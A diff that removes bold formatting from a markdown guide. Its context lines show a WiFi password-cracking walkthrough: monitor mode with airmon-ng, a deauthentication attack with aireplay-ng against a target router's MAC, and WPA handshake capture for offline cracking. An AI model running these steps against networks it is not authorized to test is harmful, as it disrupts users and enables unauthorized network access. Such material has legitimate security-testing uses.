@@ -34,8 +34,8 @@ Scan available WiFi networks:
 `nmcli device wifi list`
 
 Note down:
-- **BSSID** (example: B6:A0:A0:XX:XX:XX)
-- **CHAN** (example: 6)
+- BSSID (example: B6:A0:A0:XX:XX:XX)
+- CHAN (example: 6)
 --------------------------------------------------
 2. INSTALL REQUIRED TOOLS
 --------------------------------------------------
@@ -52,7 +52,7 @@ Check your WiFi interface:
 `iw dev`
 
 Example interface:
-**wlp4s0**
+wlp4s0
 
 Kill interfering processes:
 `sudo airmon-ng check kill`
@@ -61,7 +61,7 @@ Enable monitor mode:
 `sudo airmon-ng start wlp4s0`
 
 New interface will be:
-**wlp4s0mon**
+wlp4s0mon
 --------------------------------------------------
 4. CAPTURE THE HANDSHAKE
 --------------------------------------------------
@@ -75,10 +75,10 @@ Force reconnect (Terminal 2):
 `sudo aireplay-ng -0 5 -a <TARGET_MAC> <MON_IFACE>`
 
 Wait for this message in Terminal 1:
-**WPA handshake: <TARGET_MAC>**
+WPA handshake: <TARGET_MAC>
 
 Then press:
-**CTRL + C**
+CTRL + C
 --------------------------------------------------
 5. CRACK THE PASSWORD (OFFLINE)
 --------------------------------------------------
@@ -95,10 +95,10 @@ Restart network manager:
 --------------------------------------------------
 📌 QUICK REFERENCE
 --------------------------------------------------
-**<TARGET_MAC>** → Router MAC address (BSSID)
-**<CHANNEL>** → WiFi channel number
-**<IFACE>** → Your WiFi adapter (e.g., wlp4s0)
-**<MON_IFACE>** → Monitor interface (e.g., wlp4s0mon)
+<TARGET_MAC> → Router MAC address (BSSID)
+<CHANNEL> → WiFi channel number
+<IFACE> → Your WiFi adapter (e.g., wlp4s0)
+<MON_IFACE> → Monitor interface (e.g., wlp4s0mon)
 --------------------------------------------------
 ✅ SUMMARY
 --------------------------------------------------
